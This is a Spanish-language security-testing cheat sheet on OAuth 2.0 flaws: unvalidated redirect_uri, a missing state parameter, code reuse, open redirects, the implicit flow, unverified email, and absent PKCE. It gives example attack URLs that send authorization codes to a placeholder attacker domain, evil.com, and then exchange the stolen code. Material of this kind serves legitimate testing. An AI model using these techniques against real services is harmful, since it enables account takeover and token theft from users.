# OAuth — Vulnerabilidades en flujos OAuth 2.0

## Señales de entrada
- Botones de login social: "Continuar con Google/GitHub/Facebook".
- Parámetros: `redirect_uri`, `state`, `code`, `client_id`, `response_type`.
- Endpoints: `/oauth/authorize`, `/oauth/callback`, `/auth/callback`.
- Tokens JWT en URL fragments o query params.
- Funciones de "conectar cuenta" o "importar contactos".

## Vulnerabilidades comunes

### 1. redirect_uri no validado → robo de authorization code
```
# Cambiar redirect_uri a dominio propio
https://example.com/oauth/authorize
  ?client_id=CLIENT_ID
  &redirect_uri=https://evil.com/callback  ← cambiar esto
  &response_type=code
  &scope=openid+email

# Si la víctima hace clic, el code llega a tu servidor
# Usar ese code para obtener el token
POST /oauth/token
  code=STOLEN_CODE&redirect_uri=https://evil.com/callback
```

### 2. State parameter ausente o predecible → CSRF
```
# Si state= no existe o es fijo:
# Crear URL de autorización y forzar a la víctima a visitarla
# El callback vincula la cuenta de la víctima a la tuya
https://example.com/oauth/authorize?client_id=X&redirect_uri=Y&state=FIJO
```

### 3. Authorization code reutilizable
```
# Usar el mismo code dos veces
# Si el servidor lo acepta → código no invalidado tras primer uso
```

### 4. Open redirect en redirect_uri
```
# Usando open redirect del mismo dominio para exfiltrar code
https://example.com/oauth/authorize
  ?redirect_uri=https://example.com/redirect?url=https://evil.com
```

### 5. Implicit flow → token en URL
```
# response_type=token → access_token en fragment de URL
# Si hay open redirect o XSS → robo del token
https://example.com/oauth/authorize
  ?response_type=token
  &redirect_uri=https://example.com/xss_endpoint
```

### 6. Account takeover via email no verificado
```
# El proveedor OAuth permite email sin verificar
# Registrar cuenta OAuth con email de víctima sin verificar
# Si el servidor vincula por email → ATO
```

### 7. PKCE ausente en apps móviles/SPA
```
# Sin PKCE, el code es interceptable
# En Android: otra app puede registrar el mismo redirect_uri scheme
# custom://callback?code=AUTH_CODE
```

## Impacto alto
- Account takeover completo.
- Robo de tokens de acceso a recursos de terceros.
- Vinculación de cuenta de víctima a cuenta atacante.
- CSRF en flujo de autorización.

## Evidencia mínima
- Para redirect_uri: access token válido recibido en servidor propio.
- Para CSRF: sesión vinculada sin interacción del usuario.
- Para reutilización de code: segundo intercambio exitoso con el mismo code.
- Flujo completo documentado con requests/responses.
